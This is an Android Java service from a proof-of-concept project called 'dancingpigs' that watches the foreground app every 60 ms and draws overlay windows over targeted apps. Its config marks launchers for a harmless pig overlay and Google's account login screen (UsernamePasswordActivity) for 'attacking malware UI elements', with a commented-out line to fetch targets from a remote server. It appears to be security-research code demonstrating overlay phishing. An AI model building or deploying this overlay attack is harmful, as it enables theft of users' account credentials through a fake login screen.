package ch.example.dancingpigs;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.KeyguardManager;
import android.app.Service;
import android.content.Intent;
import android.content.res.Configuration;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import android.view.WindowManager;
import ch.example.dancingpigs.apps.OverlayActivity;
import ch.example.dancingpigs.apps.OverlayApp;
import ch.example.dancingpigs.apps.PigApp;


public class MainService extends Service {
	static MainService thisInstance = null;
    Timer timer;
    ForegroundAppTimerTask checkForegroundAppTimerTask;
    Handler handler;
	private OverlayApp[] registeredApps;
	private ArrayList<OverlayActivity> activeOverlayActivities;
	public WindowManager mWindowManager;
    
    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }
    
    public static MainService getInstance(){
    	return thisInstance;
    }

    @Override
    public IBinder onBind(Intent i) {
        return null;
    }
    
    public String[] getForegroundPackageNameClassNameAndroid5() {
    	final int START_TASK_TO_FRONT = 2;
        Field field = null;
        try {
            field = RunningAppProcessInfo.class.getDeclaredField("processState");
        } catch (Exception e) { 
        	return new String[]{"Unkown","Unknown"};
        }
    	
    	final Set<String> activePackages = new HashSet<String>();
    	ActivityManager mActivityManager = (ActivityManager) this.getSystemService(ACTIVITY_SERVICE);
		final List<ActivityManager.RunningAppProcessInfo> processInfos = mActivityManager.getRunningAppProcesses();
    	for (ActivityManager.RunningAppProcessInfo processInfo : processInfos) {
    		if (processInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
    	    	Integer state = null;
                try {
                    state = field.getInt(processInfo);
                } catch (Exception e) {
                	Log.e(this.getClass().getName(), "Couldn't get field");
                	continue;
                }
                if (state != null && state == START_TASK_TO_FRONT) {
                	return new String[]{ processInfo.processName, OverlayActivity.ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS};
                }
    		}
    	}
    	if(activePackages.size()<1){
    		activePackages.add("Unknown");
    	}
    	if(activePackages.size()<2){
    		activePackages.add("Unknown");
    	}
    	return activePackages.toArray(new String[activePackages.size()]);
    }
    
    public String[] getForegroundPackageNameClassName(){
    	ActivityManager am = (ActivityManager) this.getSystemService(ACTIVITY_SERVICE);
        RunningTaskInfo foregroundTaskInfo = am.getRunningTasks(1).get(0);
        String foregroundTaskPackageName = foregroundTaskInfo.topActivity.getPackageName();
        String foregroundTaskClassName = foregroundTaskInfo.topActivity.getClassName();
        return new String[] {foregroundTaskPackageName, foregroundTaskClassName};
    }
        
    public void timerCheckForegroundApp(){
    	timer = new Timer();
        checkForegroundAppTimerTask = new ForegroundAppTimerTask();
    	timer.schedule(checkForegroundAppTimerTask, 0, 60);
    }
    
    class ForegroundAppTimerTask extends TimerTask {
    	  
    	public ForegroundAppTimerTask() {
			super();
		}

		@Override
    	public void run() {
    		PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
    		KeyguardManager kgMgr = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
    		if(!powerManager.isScreenOn() || kgMgr.inKeyguardRestrictedInputMode()){
    			for (Iterator<OverlayActivity> i = activeOverlayActivities.iterator(); i.hasNext(); ) {  
    				final OverlayActivity act = i.next();
    				removeOverlay(act);
    			}
    			return;
    		}
    		
    		final String[] packageNameClassName;
    		int currentapiVersion = android.os.Build.VERSION.SDK_INT;
    		if (currentapiVersion >= 21){ // android.os.Build.VERSION_CODES.LOLLIPOP
        		packageNameClassName = getForegroundPackageNameClassNameAndroid5();
    		} else{
        		packageNameClassName = getForegroundPackageNameClassName();
    		}
    		String packageName;
    		String className;
    		try{
    			packageName = packageNameClassName[0];
    			className = packageNameClassName[1];
    		}
    		catch(Exception e){
    			return;
    		}
    		
    		//Use this to debug with logcat which apps/packages and classes you are able to overlay:
    		//Log.v(this.getClass().getName(), "Foreground Package: " + packageName);
			//Log.v(this.getClass().getName(), "Foreground ClassName: " + className);
    		
    		
    		for (Iterator<OverlayActivity> i = activeOverlayActivities.iterator(); i.hasNext(); ) {
				final OverlayActivity act = i.next();
				if(!act.app.getPackageName().equalsIgnoreCase(packageName) ||
						!act.getClassName().equalsIgnoreCase(className)){
					removeOverlay(act);
					break;
				}
			}
    		    		    		
    		if(activeOverlayActivities.isEmpty()){
    			for(final OverlayApp app : registeredApps){
    				if(packageName.equalsIgnoreCase(app.getPackageName())){
    					for(final OverlayActivity act : app.getActivities()){
    						if(act.getClassName().equalsIgnoreCase(className)){
    							addSupervisedOverlay(act);
    							return;
    						}
    					}
    				}
    			}
    		}
		}
    	  
    }
    
    
    public void removeOverlay(final OverlayActivity act, int delay){
    	final Handler handler = new Handler();
    	handler.postDelayed(new Runnable() {
    	    @Override
    	    public void run() {
    	    	removeOverlay(act);
    	    }
    	}, delay);
    }
    
    public void removeOverlay(final OverlayActivity act){
    	activeOverlayActivities.remove(act);
    	runOnUiThread(new Runnable(){
			    @Override
			    public void run() {
			    	removeOverlayOnUiThread(act);
			    }});
    }
   
    public void removeOverlayOnUiThread(OverlayActivity act){
    	act.setOverlayActive(false);
	    WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
	    wm.removeViewImmediate(act.getView());
    }
    
    private void addSupervisedOverlay(OverlayActivity act){
    	activeOverlayActivities.add(act);
    	addOverlay(act);
    }
    
    private void addOverlay(final OverlayActivity act){
    	runOnUiThread(new Runnable(){
			    @Override
			    public void run() {
			    	addOverlayOnUiThread(act);
			    }});
    }
    
    public void addOverlayOnUiThread(OverlayActivity act){
    	act.setOverlayActive(true);
	    ((WindowManager) getSystemService(WINDOW_SERVICE)).addView(act.getView(), act.getLayoutParams());
    }

    @Override
    public void onCreate() {
        super.onCreate();
        thisInstance = this;
        handler = new Handler();
        activeOverlayActivities = new ArrayList<OverlayActivity>();
        mWindowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        getConfig();
    }
    public void configReceived(String config){
    	//TODO: This is a very simple PoC. There are only two possible overlay outcomes:
    	//Either only a parent OverlayApp (1) instance is created, or a child PigApp (2) is created.
    	//It depends whether the config file lines start with "pig" or not.
    	//(1) In the OverlayApp and its corresponding OverlayActivity the method createView()
    	//    will put the attacking malware UI elements on the view that is later displayed
    	//(2) In the PigApp and its PigActivity the method createView() will put a pig on the view
    	//    that is later displayed (legitimate content)
    	List<OverlayApp> oal = new LinkedList<OverlayApp>();
    	for(String line : config.replace("\n","").replace("\r","").split("!!!")){
    		String[] values = line.split(",");
    		OverlayApp oa = new OverlayApp(this, values[1], values[2]);
    		if(values[0].equalsIgnoreCase("pig")){
    			oa = new PigApp(this, values[1], values[2]);
    		}
    		oal.add(oa);
    	}
        this.registeredApps = (OverlayApp[]) oal.toArray(new OverlayApp[oal.size()]);
        for(OverlayApp registeredApp : this.registeredApps){
        	registeredApp.createViews();
        }

        timerCheckForegroundApp();
    }

	private void getConfig() {
		
		//For this poc let's not setup a server, but simulate it:
		configReceived("pig,com.android.launcher,com.....!!!\n"+
				"pig,com.android.launcher,ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS!!!\n"+
				"pig,com.lge.launcher2,com.lge.launcher2.Launcher!!!\n"+
				"pig,com.lge.launcher2,ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS!!!\n"+
				"nope,com.google.android.gsf.login,com.google.android.gsf.login.UsernamePasswordActivity!!!\n"+
				"nope,com.google.android.gsf.login,ANDROID_LOLLIPOP_UNKNOWN_ACTIVITY_CLASS");
		//new HttpAsyncTask().execute("http://"+HttpDataSender.server+":"+HttpDataSender.server_port+"/"+HttpDataSender.config_file);
	}
	
	private static String convertInputStreamToString(InputStream inputStream) throws IOException{
        BufferedReader bufferedReader = new BufferedReader( new InputStreamReader(inputStream));
        String line = "";
        String result = "";
        while((line = bufferedReader.readLine()) != null)
            result += line;
 
        inputStream.close();
        return result;
    }
	
	public static String GET(String url){
        InputStream inputStream = null;
        String result = "";
        try {
            HttpClient httpclient = new DefaultHttpClient();
            HttpResponse httpResponse = httpclient.execute(new HttpGet(url));
            inputStream = httpResponse.getEntity().getContent();
            if(inputStream != null)
                result = convertInputStreamToString(inputStream);
            else
                result = "null inputStream";
 
        } catch (Exception e) {
            Log.d("InputStream", e.getLocalizedMessage());
        }
 
        return result;
    }
	
	private class HttpAsyncTask extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... urls) {
            return GET(urls[0]);
        }
        @Override
        protected void onPostExecute(String result) {
            configReceived(result);
       }
    }

	@Override
    public void onDestroy() {            
        super.onDestroy();
        if(this.activeOverlayActivities != null){
	        for(OverlayActivity act : this.activeOverlayActivities){
        		if(act.overlayView != null){
	        		WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
	        		wm.removeView(act.overlayView);
	        	}
	        }
        }
        this.activeOverlayActivities = new ArrayList<OverlayActivity>();
        stopForeground(true);
    }
    
    @Override
	public void onConfigurationChanged(Configuration newConfig) {
	    super.onConfigurationChanged(newConfig);
	    for(OverlayApp a : registeredApps){
	    	for(OverlayActivity b : a.getActivities()){
	    		b.onConfigurationChanged(newConfig);
	    	}
	    }
	}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }

}
